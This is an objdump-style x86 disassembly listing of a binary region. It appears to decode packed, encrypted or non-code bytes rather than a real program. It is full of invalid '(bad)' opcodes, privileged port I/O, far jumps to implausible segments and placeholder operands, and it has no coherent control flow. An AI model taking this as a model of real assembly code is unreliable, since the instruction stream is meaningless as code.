  42003d:	sar    DWORD PTR [edx+0x2f],1
  420040:	mov    edx,0x1b23c5ee
  420045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420046:	nop
  420047:	js     0x41ffd9
  420049:	push   cs
  42004a:	in     eax,dx
  42004b:	jnp    0x42002f
  42004d:	cmp    DWORD PTR [ebx+0xe],0x7d
  420051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420052:	or     eax,0x7acf7aad
  420057:	in     al,dx
  420058:	mov    dl,0x5e
  42005a:	push   ss
  42005b:	sahf   
  42005c:	fdiv   QWORD PTR [edx]
  42005e:	push   0xf797668f
  420063:	push   es
  420064:	sub    eax,0x2b6ef79
  420069:	hlt    
  42006a:	jl     0x4200cb
  42006c:	inc    eax
  42006d:	repnz push ecx
  42006f:	mov    ebx,0xe4573583
  420074:	xchg   esp,eax
  420075:	push   ebx
  420076:	cmp    eax,0x3c26f7d
  42007b:	push   esp
  42007c:	jmp    0x420031
  42007e:	jae    0x420068
  420080:	fdiv   QWORD PTR [ecx+0x4d]
  420083:	rcr    BYTE PTR [edi+0x5a],1
  420086:	outs   dx,DWORD PTR ds:[esi]
  420087:	fucomip st,st(0)
  420089:	retf   0xfdeb
  42008c:	cwde   
  42008d:	int3   
  42008e:	sbb    al,0x86
  420090:	hlt    
  420091:	repnz cmp al,bh
  420094:	add    DWORD PTR [edi+0x50],edi
  420097:	sbb    eax,0x45aa81be
  42009c:	pop    esp
  42009d:	dec    edi
  42009e:	ds out dx,eax
  4200a0:	fist   DWORD PTR [edi+ecx*2+0x14]
  4200a4:	int    0x11
  4200a6:	retf   
  4200a7:	mov    ds:0xad8d156e,eax
  4200ac:	cmp    al,0xa5
  4200ae:	popa   
  4200af:	and    DWORD PTR [ebp-0x3c],esp
  4200b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200b3:	cmc    
  4200b4:	sbb    dh,BYTE PTR [edi]
  4200b6:	pusha  
  4200b7:	aas    
  4200b8:	mov    al,ds:0xdf95f85c
  4200bd:	mov    esi,0x29b92817
  4200c2:	data16 cmp al,0xde
  4200c5:	jle    0x42008c
  4200c7:	out    0x5d,al
  4200c9:	mov    BYTE PTR [ebx+0x0],cl
  4200cc:	sbb    al,0x51
  4200ce:	aas    
  4200cf:	ja     0x4200c2
  4200d1:	lahf   
  4200d2:	mov    bl,0x9a
  4200d4:	cmp    ecx,DWORD PTR ds:0xf4489989
  4200da:	sbb    al,0xb2
  4200dc:	loope  0x420145
  4200de:	out    0xe4,eax
  4200e0:	in     al,dx
  4200e1:	add    BYTE PTR [ebp+0x28a93495],ah
  4200e7:	shl    bh,1
  4200e9:	retf   
  4200ea:	loop   0x4200d7
  4200ec:	js     0x420094
  4200ee:	jmp    0x194523d4
  4200f3:	push   ebp
  4200f4:	dec    esp
  4200f5:	jmp    0x4b2e:0xa2e34bc7
  4200fc:	in     eax,0x56
  4200fe:	push   ecx
  4200ff:	cmp    eax,0xa892f065
  420104:	adc    edx,DWORD PTR ss:[ebx]
  420107:	loope  0x4200bf
  420109:	jmp    0x4200c3
  42010b:	jecxz  0x4200b3
  42010d:	jnp    0x42009b
  42010f:	lds    edx,FWORD PTR [ebp-0x52f7985b]
  420115:	xchg   DWORD PTR [ecx+0x42052594],eax
  42011b:	fldenv [ebx]
  42011d:	ss or  al,0x3e
  420120:	jns    0x4200f7
  420122:	mov    eax,ebp
  420124:	pop    ds
  420125:	int    0x7a
  420127:	shl    BYTE PTR [eax],1
  420129:	xchg   ecx,eax
  42012a:	pop    edi
  42012b:	pop    ebx
  42012c:	inc    edx
  42012d:	pushf  
  42012e:	jle    0x420181
  420130:	pop    ebx
  420131:	out    0x7f,al
  420133:	fnstcw WORD PTR ds:0x9921578
  420139:	push   es
  42013a:	jbe    0x420159
  42013c:	sbb    DWORD PTR [ecx+ebp*4+0x5f],0x5772c1db
  420144:	cmp    eax,0xac3ad1f3
  420149:	or     al,0xe9
  42014b:	xchg   edx,eax
  42014c:	pop    ebp
  42014d:	pop    esi
  42014e:	mov    BYTE PTR [ecx],bl
  420150:	cmp    ebp,edi
  420152:	xor    bh,BYTE PTR [edx-0x55]
  420155:	fs sahf 
  420157:	sub    ecx,0x5f
  42015a:	mov    dh,0xe5
  42015c:	mov    WORD PTR [eax+0x12b93cac],ds
  420162:	jnp    0x420118
  420164:	add    al,0x2f
  420166:	jns    0x420180
  420168:	dec    edi
  420169:	not    DWORD PTR [ecx+eiz*8+0x21]
  42016d:	and    ecx,DWORD PTR [esi]
  42016f:	cmp    al,0x5c
  420171:	(bad)  [eax+0x3a6a9fd8]
  420177:	scas   eax,DWORD PTR es:[edi]
  420178:	scas   al,BYTE PTR es:[edi]
  420179:	(bad)  
  42017a:	push   ebp
  42017b:	jnp    0x420196
  42017d:	mov    ebx,0xba086595
  420182:	repz inc ah
  420185:	jge    0x420176
  420187:	mov    DWORD PTR ds:0x159cae15,esi
  42018d:	and    al,0xa9
  42018f:	add    DWORD PTR [ebx-0x5983525d],eax
  420195:	mov    eax,0x144f78b3
  42019a:	xchg   ebp,eax
  42019b:	cmp    edi,esp
  42019d:	sub    al,0x8f
  42019f:	retf   0x842b
  4201a2:	push   edi
  4201a3:	cmp    eax,DWORD PTR [ecx+0xbe55716]
  4201a9:	or     ah,dl
  4201ab:	call   0x6aaf1bd6
  4201b0:	std    
  4201b1:	loopne 0x4201f0
  4201b3:	jmp    0x420218
  4201b5:	add    bl,al
  4201b7:	ror    cl,1
  4201b9:	pop    esp
  4201ba:	and    BYTE PTR [ebp-0x4a889baa],dl
  4201c0:	sub    dh,al
  4201c2:	push   eax
  4201c3:	adc    bh,BYTE PTR [edi]
  4201c5:	jle    0x420234
  4201c7:	fs and eax,0x86904738
  4201cd:	cwde   
  4201ce:	fidivr DWORD PTR [eax]
  4201d0:	clc    
  4201d1:	fdivr  QWORD PTR [edi+0x5e3bab2b]
  4201d7:	xor    ah,BYTE PTR [ebp+ebx*1+0x13]
  4201db:	xchg   DWORD PTR [eax-0x13],esi
  4201de:	xchg   esi,eax
  4201df:	inc    edi
  4201e0:	cdq    
  4201e1:	add    bl,bl
  4201e3:	iret   
  4201e4:	rcr    BYTE PTR [edi],0x12
  4201e7:	sub    al,0xbc
  4201e9:	dec    ebx
  4201ea:	cmc    
  4201eb:	pop    ebp
  4201ec:	jno    0x420213
  4201ee:	out    0xb6,al
  4201f0:	leave  
  4201f1:	les    esi,FWORD PTR [edi]
  4201f3:	ror    BYTE PTR [ecx-0x79],1
  4201f6:	arpl   WORD PTR [ebp-0x5c],bx
  4201f9:	inc    edi
  4201fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201fb:	jl     0x4201ac
  4201fd:	and    eax,DWORD PTR ds:0x99ba465a
  420203:	scas   eax,DWORD PTR es:[edi]
  420204:	sub    BYTE PTR [ebx-0x3a],bh
  420207:	dec    eax
  420208:	cmp    eax,0x51ae6a85
  42020d:	add    DWORD PTR [edx],0x752c4310
  420213:	mov    ds:0x387d04fb,eax
  420218:	sub    esi,DWORD PTR [ebp-0x1da008c8]
  42021e:	das    
  42021f:	pop    esi
  420220:	and    al,0xe9
  420222:	or     BYTE PTR [edi],dh
  420224:	mov    eax,cs
  420226:	jno    0x420210
  420228:	inc    edx
  420229:	int3   
  42022a:	aad    0xd4
  42022c:	mov    ecx,0x5e6866f6
  420231:	pop    ss
  420232:	sbb    bl,BYTE PTR [ecx]
  420234:	mov    ebx,?
  420236:	stc    
  420237:	mov    eax,0x9de0a67f
  42023c:	xchg   esp,eax
  42023d:	sbb    al,0x7c
  42023f:	lods   eax,DWORD PTR ds:[esi]
  420240:	outs   dx,BYTE PTR ds:[esi]
  420241:	popa   
  420242:	mov    ah,0xd0
  420244:	pushf  
  420245:	mov    ds:0x3d4e7a3f,al
  42024a:	or     bl,bh
  42024c:	fld    QWORD PTR [eax+eax*1+0x0]
  420250:	add    BYTE PTR [eax],al
  420252:	xchg   esi,eax
  420253:	test   BYTE PTR [ebp-0x2],al
  420256:	push   edi
  420257:	(bad)  
  420258:	mov    edi,0xa59b80ec
  42025d:	and    ch,bl
  42025f:	jae    0x420229
  420261:	fucom  st(1)
  420263:	jl     0x420266
  420265:	add    ah,dh
  420267:	add    al,0x0
  420269:	add    BYTE PTR [edi],dh
  42026b:	out    dx,eax
  42026c:	addr16 aas 
  42026e:	test   DWORD PTR [eax],esp
  420270:	cmp    ecx,ecx
  420272:	inc    ebx
  420273:	fcomp  QWORD PTR [eax]
  420275:	adc    esp,edx
  420277:	(bad)  [ecx+0x3c5f8415]
  42027d:	push   es
  42027e:	push   ebp
  42027f:	sbb    bh,ch
  420281:	inc    ecx
  420282:	cwde   
  420283:	aad    0xdd
  420285:	mov    WORD PTR [esi+esi*2+0x3],?
  420289:	in     al,dx
  42028a:	inc    edx
  42028b:	stc    
  42028c:	loope  0x420260
  42028e:	mov    ebx,0x50f2f43c
  420293:	and    eax,0x5b7b7690
  420298:	cmp    al,0x4a
  42029a:	mov    ecx,0xbbb057d5
  42029f:	xor    DWORD PTR [ebx+0x6c],0x64
  4202a3:	lods   al,BYTE PTR ds:[esi]
  4202a4:	mov    WORD PTR [ebx],cs
  4202a6:	xchg   ebp,eax
  4202a7:	ficomp WORD PTR [edi-0x4b]
  4202aa:	out    dx,al
  4202ab:	add    bl,BYTE PTR [ebx-0x15]
  4202ae:	imul   ecx,edi,0xffffffb2
  4202b1:	or     BYTE PTR [ebp+0x5d],0x3
  4202b5:	mov    ah,0x47
  4202b7:	or     eax,0x60e140c9
  4202bc:	pushf  
  4202bd:	(bad)  
  4202be:	pmaddwd mm0,QWORD PTR [ecx]
  4202c1:	imul   eax,DWORD PTR [eax],0xffffffe7
  4202c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202c5:	fsubrp st(1),st
  4202c7:	xor    dl,BYTE PTR [esi+0x34]
  4202ca:	dec    edx
  4202cb:	jmp    0x42024e
  4202cd:	and    esi,DWORD PTR [ecx+ebp*4+0x7a]
  4202d1:	fidivr DWORD PTR [edx-0x68f3f477]
  4202d7:	inc    edi
  4202d8:	popf   
  4202d9:	adc    dl,BYTE PTR [edi-0x24]
  4202dc:	xchg   ecx,eax
  4202dd:	sub    cl,ch
  4202df:	pop    esi
  4202e1:	jbe    0x420309
  4202e3:	cmp    esi,DWORD PTR [edi-0x5b]
  4202e6:	mov    DWORD PTR [ebx+0x47f6692],0xd94c8604
  4202f0:	test   al,0x37
  4202f2:	fdiv   st(1),st
  4202f4:	gs cmc 
  4202f6:	dec    ebp
  4202f7:	out    0x94,eax
  4202f9:	imul   esi,esp,0xffffffd8
  4202fc:	call   0x92670ea9
  420301:	mov    ds:0x74142c04,eax
  420306:	xor    eax,0x88b218e0
  42030b:	cli    
  42030c:	out    dx,al
  42030d:	xor    al,0xff
  42030f:	(bad)  
  420310:	fdiv   DWORD PTR [edi+edi*2-0x6b]
  420314:	test   BYTE PTR [esp+eiz*8+0x29],0xff
  420319:	sar    DWORD PTR [edi],0xc8
  42031c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42031d:	adc    al,0xa9
  42031f:	cs loope 0x42030d
  420322:	bound  edi,QWORD PTR [edx-0x5d1e291f]
  420328:	and    al,0xab
  42032a:	xor    al,0xc7
  42032c:	stos   DWORD PTR es:[edi],eax
  42032d:	pop    edx
  42032e:	inc    esp
  42032f:	jmp    0x4202dd
  420331:	out    dx,eax
  420332:	pop    ebx
  420333:	jmp    0x4410aa62
  420338:	or     dl,bl
  42033a:	clc    
  42033b:	xor    al,0xe3
  42033d:	add    BYTE PTR [edi+0x55],al
  420340:	call   0x51d9:0x133fe297
  420347:	xor    BYTE PTR [edx+eiz*1],dh
  42034a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42034b:	jo     0x4202f6
  42034d:	pop    gs
  42034f:	nop
  420350:	mov    bl,0x38
  420352:	ret    
  420353:	jg     0x420376
  420355:	outs   dx,BYTE PTR ds:[esi]
  420356:	cmp    eax,0x749f6878
  42035b:	loopne 0x420329
  42035d:	inc    eax
  42035e:	cmp    ecx,DWORD PTR [eax+0x27ebf800]
  420364:	mov    edi,0x99a562d4
  420369:	sbb    DWORD PTR [edi],esi
  42036b:	lahf   
  42036c:	outs   dx,DWORD PTR ds:[esi]
  42036d:	aad    0xb4
  42036f:	sub    DWORD PTR [edx],0x24912a86
  420375:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420376:	emms   
  420378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420379:	pop    eax
  42037a:	push   eax
  42037b:	pop    esp
  42037c:	pop    edx
  42037d:	mov    bh,0x73
  42037f:	jp     0x420329
  420381:	sbb    ah,BYTE PTR [ecx-0x5a]
  420384:	pop    edx
  420385:	mov    esi,0x96c7c28d
  42038a:	mov    eax,ds:0xe70a1302
  42038f:	inc    edi
  420390:	in     al,dx
  420391:	ds mov ebp,0xdf9d3a69
  420397:	adc    ebp,DWORD PTR [edi+0x18]
  42039a:	push   esi
  42039b:	jae    0x4203ac
  42039d:	mov    dl,0xe1
  42039f:	adc    DWORD PTR [edi+0x7a],esp
  4203a2:	mov    edi,0x248dc983
  4203a7:	xchg   esi,eax
  4203a8:	sub    DWORD PTR [edx+esi*1+0x77],edi
  4203ac:	(bad)  
  4203ad:	and    eax,DWORD PTR [esi+0x7357707c]
  4203b3:	ret    
  4203b4:	div    BYTE PTR [edi+edx*4]
  4203b7:	push   ds
  4203b8:	mov    gs,WORD PTR [eax+0x2d]
  4203bb:	or     ebp,0x1
  4203be:	push   ecx
  4203bf:	in     eax,dx
  4203c0:	mov    esp,0xae443b03
  4203c5:	xchg   edx,eax
  4203c6:	xchg   ebp,eax
  4203c7:	jbe    0x42034e
  4203c9:	and    bh,ch
  4203cb:	jnp    0x420386
  4203cd:	mov    ebx,0xe3c661ab
  4203d2:	or     al,0x1a
  4203d4:	call   0x2b0f:0x51911e5d
  4203db:	call   0x17e3:0x9fd81b09
  4203e2:	pop    ebx
  4203e3:	cdq    
  4203e4:	push   es
  4203e5:	xchg   edx,eax
  4203e6:	std    
  4203e7:	xchg   esp,eax
  4203e8:	xor    bh,al
  4203ea:	pop    eax
  4203eb:	sbb    al,0x7f
  4203ed:	retf   0x181f
  4203f0:	out    dx,eax
  4203f1:	sar    BYTE PTR [eax+0x4d],0x18
  4203f5:	mov    ebx,0x9a2d0e46
  4203fa:	add    WORD PTR [edi+ecx*1+0x78b8a8e5],bx
  420402:	mov    dh,0xf4
  420404:	sbb    cl,BYTE PTR [edi-0x18]
  420407:	or     eax,0xb320ac88
  42040c:	retf   0x63d
  42040f:	imul   esi,DWORD PTR [edx+0x52],0x7
  420413:	cli    
  420414:	clc    
  420415:	mov    edx,0x2b6bc857
  42041a:	clc    
  42041b:	outs   dx,DWORD PTR ds:[esi]
  42041c:	xchg   esp,eax
  42041d:	dec    edx
  42041e:	or     BYTE PTR [ebx+eax*1-0x58],cl
  420422:	cmp    bl,al
  420424:	ret    0x1534
  420427:	test   dl,dl
  420429:	jmp    0x9b2c:0x6ca32216
  420430:	mov    bh,0xa6
  420432:	jbe    0x420447
  420434:	push   ss
  420435:	sbb    eax,0x8ae0433a
  42043a:	bound  edx,QWORD PTR [ebx]
  42043c:	mov    eax,ds:0x3f6eac4d
  420441:	lods   al,BYTE PTR ds:[esi]
  420442:	mov    bl,0xf5
  420444:	push   edx
  420445:	or     ah,BYTE PTR [edx+0x4d19327d]
  42044b:	fdivrp st(5),st
  42044d:	xchg   edx,eax
  42044e:	push   0x3f
  420450:	sbb    esi,edx
  420452:	aaa    
  420453:	mov    ecx,0xc596fd0d
  420458:	mov    eax,ds:0x87c39dbb
  42045d:	add    al,0x93
  42045f:	push   0x1f0c1c0
  420464:	daa    
  420465:	add    al,0xe2
  420467:	ins    BYTE PTR es:[edi],dx
  420468:	outs   dx,BYTE PTR ds:[esi]
  420469:	cwde   
  42046a:	into   
  42046b:	or     BYTE PTR [ecx-0x3],dh
  42046e:	jp     0x4203f4
  420470:	in     eax,dx
  420471:	popf   
  420472:	add    DWORD PTR [ebx+0x32],0xaef1d498
  420479:	push   edi
  42047a:	or     esi,DWORD PTR ds:0xa1de1535
  420480:	leave  
  420481:	cdq    
  420482:	and    al,0xd6
  420484:	addr16 mov esi,0xc6df24
  42048a:	addr16 adc al,0x6
  42048d:	and    DWORD PTR [ebx-0x75],0x61
  420491:	outs   dx,DWORD PTR ds:[esi]
  420492:	jne    0x420463
  420494:	pop    eax
  420495:	shl    bl,cl
  420497:	sti    
  420498:	fdivr  QWORD PTR [edi]
  42049a:	mov    cl,0xb4
  42049c:	mov    edi,DWORD PTR [ecx-0x41]
  42049f:	jle    0x42046b
  4204a1:	mov    ebp,0x9dda001b
  4204a6:	jl     0x420443
  4204a8:	outs   dx,BYTE PTR ds:[esi]
  4204a9:	adc    edi,ebp
  4204ab:	jmp    0x805d:0xb68e51a3
  4204b2:	xor    BYTE PTR [edi],cl
  4204b4:	pushf  
  4204b5:	lock ja 0x4204a5
  4204b8:	int    0xa6
  4204ba:	mov    bh,0x8a
  4204bc:	sub    DWORD PTR [ecx-0x9247e13],edx
  4204c2:	xor    si,WORD PTR ds:0xbaaf3456
  4204c9:	adc    DWORD PTR [ebx+edx*8],esi
  4204cc:	push   esi
  4204cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204ce:	ds mov ah,0xd6
  4204d1:	in     al,0x86
  4204d3:	add    eax,0x3b15f864
  4204d8:	or     eax,0xf9e502ed
  4204dd:	call   0x13f9:0x63581690
  4204e4:	sub    BYTE PTR [ecx-0x12f92203],0xfe
  4204eb:	cs jmp 0xc6b2b318
  4204f1:	fidiv  WORD PTR [eax-0xd4c70f4]
  4204f7:	push   0x77
  4204f9:	pop    eax
  4204fa:	in     al,0x56
  4204fc:	popa   
  4204fd:	adc    esp,edx
  4204ff:	gs ins BYTE PTR es:[edi],dx
  420501:	mov    esi,0x1c7dae2
  420506:	pop    ebp
  420507:	inc    esp
  420508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42050a:	fcmovbe st,st(3)
  42050c:	add    al,BYTE PTR [eax-0x1c57555d]
  420512:	pop    edx
  420513:	pop    ebp
  420514:	pop    edx
  420515:	mul    BYTE PTR [ecx-0x21]
  420518:	mov    ch,0xd4
  42051a:	xchg   DWORD PTR [eax+0x1e202307],esp
  420520:	out    0x5,al
  420522:	xchg   DWORD PTR [eax],ebp
  420524:	add    eax,0x1f132e1a
  420529:	test   eax,0x9ba0e8c6
  42052e:	inc    ecx
  42052f:	outs   dx,BYTE PTR ds:[esi]
  420530:	mov    ds:0xca367160,eax
  420535:	jle    0x42050c
  420537:	dec    esp
  420538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420539:	xlat   BYTE PTR ds:[ebx]
  42053a:	pop    es
  42053b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42053c:	aaa    
  42053d:	mov    eax,0x78f9d424
  420542:	cs test al,0xf5
  420545:	push   ecx
  420546:	xor    BYTE PTR [edi-0x5274c871],bl
  42054c:	outs   dx,DWORD PTR ds:[si]
  42054e:	and    bh,BYTE PTR gs:[ebp+edi*1+0x2be54c9e]
  420556:	cmp    BYTE PTR [ebp+eiz*4-0x3f1244a5],dl
  42055d:	or     eax,0x6aa6ed24
  420562:	add    esp,eax
  420564:	push   ebx
  420565:	mov    dh,cl
  420567:	into   
  420568:	mov    edi,0x4cd9c55f
  42056d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42056e:	mov    dh,0xb6
  420570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420571:	mov    al,ds:0xfa00e538
  420576:	ror    esi,0x4d
  420579:	popa   
  42057a:	das    
  42057b:	mov    ds:0x9e2518a3,eax
  420580:	and    BYTE PTR [esi+0x3aa34891],bh
  420586:	adc    ch,BYTE PTR [ecx]
  420588:	pop    es
  420589:	cmp    al,0xdd
  42058b:	jo     0x420583
  42058d:	push   cs
  42058e:	iret   
  42058f:	test   DWORD PTR [edi],ebp
  420591:	test   al,0xd7
  420593:	xor    al,bl
  420595:	mov    cl,0xd8
  420597:	rol    bh,1
  420599:	mov    BYTE PTR ds:0x29feca9,dh
  42059f:	fstp   QWORD PTR [edx+edi*8]
  4205a2:	xchg   esp,eax
  4205a3:	pusha  
  4205a4:	cs in  eax,0xa3
  4205a7:	jae    0x4205b8
  4205a9:	in     al,dx
  4205aa:	add    eax,0xa495d3b5
  4205af:	outs   dx,BYTE PTR ds:[esi]
  4205b0:	push   ss
  4205b1:	mov    esp,0x9714d23
  4205b6:	push   es
  4205b7:	repz ja 0x42060c
  4205ba:	ss test eax,ecx
  4205bd:	push   ds
  4205be:	jb     0x4205ea
  4205c0:	add    dh,al
  4205c2:	xor    DWORD PTR [esp+eax*2],ebp
  4205c5:	leave  
  4205c6:	inc    ebx
  4205c7:	inc    edi
  4205c8:	xchg   edi,eax
  4205c9:	push   edx
  4205ca:	jno    0x42061b
  4205cc:	ins    DWORD PTR es:[di],dx
  4205ce:	bound  ecx,QWORD PTR [esi-0x6a]
  4205d1:	or     BYTE PTR [ebx+0x2d78eaeb],dl
  4205d7:	sbb    ecx,DWORD PTR [ebx]
  4205d9:	ins    BYTE PTR es:[edi],dx
  4205da:	pop    ecx
  4205db:	stos   BYTE PTR es:[edi],al
  4205dc:	mov    ecx,0xb7a5a5e8
  4205e1:	imul   edx,DWORD PTR [ebp-0x23],0x96594371
  4205e8:	int3   
  4205e9:	lahf   
  4205ea:	dec    esi
  4205eb:	xchg   ecx,eax
  4205ec:	inc    esp
  4205ed:	dec    eax
  4205ee:	addr16 stc 
  4205f0:	pusha  
  4205f1:	test   DWORD PTR [ebp+ebx*4-0x3c],esi
  4205f5:	xlat   BYTE PTR ds:[ebx]
  4205f6:	mov    esi,0x954f50d
  4205fb:	aad    0x4a
  4205fd:	outs   dx,DWORD PTR ds:[esi]
  4205fe:	stos   DWORD PTR es:[edi],eax
  4205ff:	ja     0x420632
  420601:	imul   esi,DWORD PTR [eax+edx*2],0x77
  420605:	add    ecx,0x6a
  420608:	shl    BYTE PTR [edx-0x74],cl
  42060b:	xchg   esi,eax
  42060c:	sbb    edi,ecx
  42060e:	push   ebp
  42060f:	xchg   esp,eax
  420610:	leave  
  420611:	test   al,0xac
  420613:	dec    ebp
  420614:	daa    
  420615:	dec    esp
  420616:	mov    ds:0x5af14a9a,al
  42061b:	mov    fs,WORD PTR [esi]
  42061d:	clc    
  42061e:	adc    dh,BYTE PTR [edi+esi*1]
  420621:	loope  0x4205bc
  420623:	or     eax,0xd10bf439
  420628:	cmp    DWORD PTR [ebp+ecx*2-0x1b1030b0],0x4b
  420630:	outs   dx,BYTE PTR ds:[esi]
  420631:	mov    WORD PTR [ecx+0x79],es
  420634:	and    DWORD PTR [esi-0x4e0a6fdd],eax
  42063a:	out    0x4f,eax
  42063c:	rcl    DWORD PTR [ebx+0x3d],1
  42063f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420640:	and    DWORD PTR [esi-0xf444a7b],esp
  420646:	mov    bl,0x95
  420648:	mov    ecx,0x6ca5f540
  42064d:	sbb    esi,DWORD PTR ds:0xd8b0d0be
  420653:	std    
  420654:	cmp    bh,BYTE PTR [edx-0x63]
  420657:	mov    ah,0x7
  420659:	sub    dh,cl
  42065b:	xchg   esi,eax
  42065c:	gs test al,0x95
  42065f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420660:	dec    eax
  420661:	push   ebp
  420662:	pop    esi
  420663:	fisttp QWORD PTR [ecx+0x2c]
  420666:	out    0x9a,al
  420668:	repnz icebp 
  42066a:	fild   DWORD PTR [ecx-0x57]
  42066d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42066e:	xor    DWORD PTR [ebx],0xb77a9d8a
  420674:	xor    al,0xcd
  420676:	iret   
  420677:	jno    0x420663
  420679:	in     eax,0xb5
  42067b:	add    DWORD PTR [esi+0x74],edi
  42067e:	mov    eax,0xfc00f361
  420683:	and    ah,bh
  420685:	pushf  
  420686:	mov    ebp,esp
  420688:	loopne 0x42062b
  42068a:	mov    edx,0x741c3f65
  42068f:	(bad)  
  420690:	rcr    bh,cl
  420692:	mov    bl,0x10
  420694:	jecxz  0x42070f
  420696:	sbb    ah,BYTE PTR [ecx]
  420698:	cmp    DWORD PTR ds:0x4a4b14bf,esi
  42069e:	jp     0x4206b3
  4206a0:	sti    
  4206a1:	mov    ds:0xc5b2a436,al
  4206a6:	add    al,0x57
  4206a8:	rcr    BYTE PTR [ebp-0x5ce6d9b],1
  4206ae:	push   0x1ef9a450
  4206b3:	lahf   
  4206b4:	lock push eax
  4206b6:	test   DWORD PTR [ebp+edx*2-0x3d33c7fb],edi
  4206bd:	dec    eax
  4206be:	sahf   
  4206bf:	fs test eax,0xca3ceb64
  4206c5:	pop    DWORD PTR [ebp-0x4d]
  4206c8:	or     eax,0x2f97f4d0
  4206cd:	inc    ecx
  4206ce:	cdq    
  4206cf:	xchg   esi,eax
  4206d0:	pop    ds
  4206d1:	xlat   BYTE PTR ds:[ebx]
  4206d2:	pushf  
  4206d3:	lds    edi,FWORD PTR [edi+0x78c190ac]
  4206d9:	daa    
  4206da:	dec    ah
  4206dc:	adc    BYTE PTR [edi+0x36f6fe51],al
  4206e2:	je     0x42070c
  4206e4:	scas   al,BYTE PTR es:[edi]
  4206e5:	shr    BYTE PTR [ebp-0x38],cl
  4206e8:	cdq    
  4206e9:	cmp    cl,bh
  4206eb:	adc    eax,0x986f875c
  4206f0:	mov    edi,0x1291ef31
  4206f5:	jl     0x420693
  4206f7:	imul   ebx,DWORD PTR [edx-0x55ecd568],0x82e9806f
  420701:	and    ebx,DWORD PTR [esi+0x22]
  420704:	push   esi
  420705:	nop
  420706:	dec    eax
  420707:	stc    
  420708:	je     0x4206f8
  42070a:	inc    eax
  42070b:	jge    0x4206ca
  42070d:	jecxz  0x4206d2
  42070f:	stos   BYTE PTR es:[edi],al
  420710:	jge    0x420764
  420712:	aad    0xe7
  420714:	xchg   DWORD PTR [ecx],ecx
  420716:	pop    edi
  420717:	mov    eax,0x54fade5e
  42071c:	and    BYTE PTR [esi-0x52373591],dh
  420722:	jno    0x42070c
  420724:	push   0xffffffae
  420726:	ins    DWORD PTR es:[edi],dx
  420727:	xor    dh,BYTE PTR [esi+0x7e99ab0]
  42072d:	pop    ebp
  42072e:	adc    bh,BYTE PTR [eax+0x4c]
  420731:	fisubr DWORD PTR [esi]
  420733:	popf   
  420734:	mov    eax,ds:0x1546bf3a
  420739:	dec    edx
  42073a:	push   esi
  42073b:	fxch   st(3)
  42073d:	ins    BYTE PTR es:[edi],dx
  42073e:	rcr    BYTE PTR [esi+0x5b],0x20
  420742:	pusha  
  420743:	and    edi,DWORD PTR ds:[ebp+0x40]
  420747:	xor    cl,BYTE PTR [ecx+eiz*4]
  42074a:	xchg   edi,eax
  42074b:	stos   DWORD PTR es:[edi],eax
  42074c:	add    al,0xde
  42074e:	outs   dx,DWORD PTR ds:[esi]
  42074f:	fldenv [ecx-0x651f1c82]
  420755:	or     al,al
  420757:	(bad)  
  420758:	jg     0x420757
  42075a:	mov    dh,0x2d
  42075c:	stos   DWORD PTR es:[edi],eax
  42075d:	jbe    0x42075f
  42075f:	add    BYTE PTR [eax],al
  420761:	add    BYTE PTR [ecx],ah
  420763:	pop    ds
  420764:	fld    QWORD PTR [esi]
  420766:	inc    esi
  420768:	sti    
  420769:	aas    
  42076a:	jb     0x42078b
  42076c:	add    edx,edx
  42076e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42076f:	pop    esp
  420770:	call   0x1c3dcff
  420775:	add    ah,dh
  420777:	add    al,0x0
  420779:	add    dh,bl
  42077b:	xchg   DWORD PTR [edx+ebx*2],ecx
  42077e:	dec    edx
  42077f:	mov    BYTE PTR [eax-0x12],0x67
  420783:	xchg   esi,eax
  420784:	out    0xd2,al
  420786:	xor    DWORD PTR [eax-0x7a],edi
  420789:	je     0x42071a
  42078b:	adc    esi,DWORD PTR [ecx]
  42078d:	push   ecx
  42078e:	repz lea ecx,[ecx]
  420791:	pop    ebx
  420792:	ja     0x420801
  420794:	ja     0x4207dd
  420796:	sub    BYTE PTR [ebx+0x189ebf4],0xff
  42079d:	push   esp
  42079e:	cld    
  42079f:	add    eax,ecx
  4207a1:	adc    eax,0xf9cedaa0
  4207a6:	dec    esp
  4207a7:	pop    esi
  4207a8:	pop    edi
  4207a9:	lock out 0xc3,al
  4207ac:	cmp    BYTE PTR [eax+0x53],al
  4207af:	xchg   ecx,eax
  4207b0:	jmp    0x42fca3d0
  4207b5:	jecxz  0x4207e5
  4207b7:	adc    al,0x28
  4207b9:	inc    edi
  4207ba:	jmp    0x346:0xc2d94588
  4207c1:	push   eax
  4207c2:	nop
  4207c3:	sub    DWORD PTR [esi-0xaf55bcf],ecx
  4207c9:	push   ebp
  4207ca:	pop    esi
  4207cb:	nop
  4207cc:	hlt    
  4207cd:	js     0x42079c
  4207cf:	out    dx,al
  4207d0:	mov    eax,ds:0xf0e4ed59
  4207d5:	pop    edi
  4207d6:	sub    bh,dl
  4207d8:	lea    esp,[edi]
  4207da:	pop    edx
  4207db:	mov    bl,0x19
  4207dd:	fild   DWORD PTR [eax-0x60]
  4207e0:	imul   ebx,DWORD PTR [eax],0x74699d8d
  4207e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207e7:	call   0xd882:0xd98a2dc4
  4207ee:	adc    al,0x95
  4207f0:	push   esp
